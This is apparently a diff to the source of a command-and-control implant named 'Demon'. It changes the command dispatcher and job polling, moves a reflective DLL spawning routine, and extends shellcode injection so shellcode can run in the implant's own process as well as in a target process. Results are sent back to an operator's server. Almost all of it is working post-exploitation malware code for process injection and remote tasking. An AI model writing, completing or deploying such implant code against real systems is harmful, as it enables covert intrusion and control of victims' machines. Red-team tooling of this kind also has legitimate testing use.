@@ -118,10 +118,14 @@ VOID CommandDispatcher( VOID )
             break;
 #endif
         }
+        PackageFirst = TRUE;
 
+        /* === End routine checks === */
         // Check if we have something in our Pivots connection and sends back the output from the pipes
         PivotCollectOutput();
-        PackageFirst = TRUE;
+        // Check if there is something that a process output is available or check if the jobs are still alive.
+        JobCheckList();
+
     } while ( TRUE );
 
     Instance->Session.Connected = FALSE;
@@ -169,7 +173,7 @@ VOID CommandJob( PPARSER Parser )
             do {
                 if ( JobList )
                 {
-                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]", JobList->JobID, JobList->Type, JobList->State )
+                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )
 
                     PackageAddInt32( Package, JobList->JobID );
                     PackageAddInt32( Package, JobList->Type );
@@ -419,6 +423,8 @@ VOID CommandProc( PPARSER DataArgs )
             {
                 if ( ProcessVerbose )
                     PackageAddInt32( Package, ProcessInfo.dwProcessId );
+
+                // Instance->Win32.NtClose( ProcessInfo.hThread );
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
@@ -1121,6 +1127,23 @@ VOID CommandInjectDLL( PPARSER DataArgs )
     PackageTransmit( Package, NULL, NULL );
 }
 
+VOID CommandSpawnDLL( PPARSER DataArgs )
+{
+    PPACKAGE      Package   = NULL;
+    INJECTION_CTX InjCtx    = { 0 };
+    DWORD         DllSize   = 0;
+    DWORD         ArgSize   = 0;
+    PCHAR         DllBytes  = ParserGetBytes( DataArgs, &DllSize );
+    PCHAR         Arguments = ParserGetBytes( DataArgs, &ArgSize );
+    DWORD         Result    = 0;
+
+    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
+    Result  = DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
+
+    PackageAddInt32( Package, Result );
+    PackageTransmit( Package, NULL, NULL );
+}
+
 VOID CommandInjectShellcode( PPARSER DataArgs )
 {
     PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
@@ -1145,7 +1168,7 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
 
     PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );
 
-    if ( Inject )
+    if ( Inject == 1 )
     {
         // Inject into running process
         CLIENT_ID         ClientID = { TargetPID, 0 };
@@ -1160,9 +1183,10 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
             return;
         }
     }
-    else
+    else if ( Inject == 2 )
     {
-        // Spawn & Inject
+        // Execute
+        InjectionCtx.hProcess = NtCurrentProcess();
     }
 
     Technique = Technique == 0 ? Instance->Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config
@@ -1180,25 +1204,6 @@ VOID CommandInjectShellcode( PPARSER DataArgs )
     PRINTF( "Injection Result => %d", Result )
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
-}
-
-VOID CommandSpawnDLL( PPARSER DataArgs )
-{
-    PPACKAGE      Package   = NULL;
-    INJECTION_CTX InjCtx    = { 0 };
-    DWORD         DllSize   = 0;
-    DWORD         ArgSize   = 0;
-    PCHAR         DllBytes  = ParserGetBytes( DataArgs, &DllSize );
-    PCHAR         Arguments = ParserGetBytes( DataArgs, &ArgSize );
-
-    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );
-
-    if ( DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx ) )
-        PackageAddInt32( Package, TRUE );
-    else
-        PackageAddInt32( Package, FALSE );
-
     PackageTransmit( Package, NULL, NULL );
 }
 
